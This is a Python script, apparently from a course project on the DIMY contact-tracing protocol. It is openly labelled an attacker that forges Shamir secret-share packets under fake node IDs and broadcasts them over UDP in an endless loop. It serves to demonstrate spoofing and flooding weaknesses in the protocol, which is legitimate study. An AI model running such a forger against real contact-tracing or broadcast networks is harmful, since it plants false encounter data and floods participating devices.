from __future__ import annotations

import argparse
import json
import socket
import time
from typing import Any

from src.config import (
    DEFAULT_K,
    DEFAULT_N,
    DEFAULT_T,
    DEFAULT_UDP_BROADCAST_IP,
    DEFAULT_UDP_PORT,
    MIN_K,
    MIN_N,
    VALID_T_VALUES,
)
from src.crypto_utils import generate_ephid_keypair
from src.protocol_utils import make_share_packet
from src.shamir_utils import serialize_share, split_secret


def build_fake_packets(
    *,
    fake_sender_id: str,
    epoch_id: int,
    k: int,
    n: int,
) -> list[dict[str, Any]]:
    ephid = generate_ephid_keypair()
    shares = split_secret(ephid.public_key_bytes, k=k, n=n)

    packets: list[dict[str, Any]] = []
    for share in shares[:k]:
        packets.append(
            make_share_packet(
                sender_id=fake_sender_id,
                epoch_id=epoch_id,
                ephid_hash=ephid.ephid_hash,
                k=k,
                n=n,
                serialized_share=serialize_share(share),
                timestamp=time.time(),
            )
        )
    return packets


def _validate_args(parser: argparse.ArgumentParser, args: argparse.Namespace) -> None:
    if args.k < MIN_K:
        parser.error(f"k must be >= {MIN_K}")
    if args.n < MIN_N:
        parser.error(f"n must be >= {MIN_N}")
    if args.k >= args.n:
        parser.error("k must be < n")
    if args.target_port < 1 or args.target_port > 65535:
        parser.error("target_port must be in range 1..65535")
    if args.fake_nodes <= 0:
        parser.error("--fake-nodes must be positive")
    if args.share_interval <= 0:
        parser.error("--share-interval must be positive")
    if args.round_interval <= 0:
        parser.error("--round-interval must be positive")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="DIMY attacker / forged-share broadcaster")
    parser.add_argument("t", type=int, nargs="?", default=DEFAULT_T, choices=VALID_T_VALUES)
    parser.add_argument("k", type=int, nargs="?", default=DEFAULT_K)
    parser.add_argument("n", type=int, nargs="?", default=DEFAULT_N)
    parser.add_argument("--target-ip", default=DEFAULT_UDP_BROADCAST_IP)
    parser.add_argument("--target-port", type=int, default=DEFAULT_UDP_PORT)
    parser.add_argument("--fake-nodes", type=int, default=3)
    parser.add_argument("--share-interval", type=float, default=0.05)
    parser.add_argument("--round-interval", type=float, default=3.0)
    parser.add_argument("--quiet", action="store_true")
    args = parser.parse_args()
    _validate_args(parser, args)
    return args


def main() -> None:
    args = parse_args()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    def log(message: str) -> None:
        if not args.quiet:
            print(f"[attacker] {message}")

    log(
        f"started t={args.t} k={args.k} n={args.n} "
        f"target={args.target_ip}:{args.target_port} fake_nodes={args.fake_nodes}"
    )

    round_id = 0
    while True:
        epoch_id = int(time.time() // args.t)

        for i in range(args.fake_nodes):
            fake_id = f"attacker-{round_id}-{i}"
            packets = build_fake_packets(
                fake_sender_id=fake_id,
                epoch_id=epoch_id,
                k=args.k,
                n=args.n,
            )

            log(f"broadcasting fake node {fake_id}")
            for packet in packets:
                payload = json.dumps(
                    packet, separators=(",", ":"), sort_keys=True
                ).encode("utf-8")
                sock.sendto(payload, (args.target_ip, args.target_port))
                share_index = packet["share"].split(":", 1)[0]
                log(f"sent fake share sender={fake_id} share={share_index}/{args.n}")
                time.sleep(args.share_interval)

        round_id += 1
        time.sleep(args.round_interval)


if __name__ == "__main__":
    main()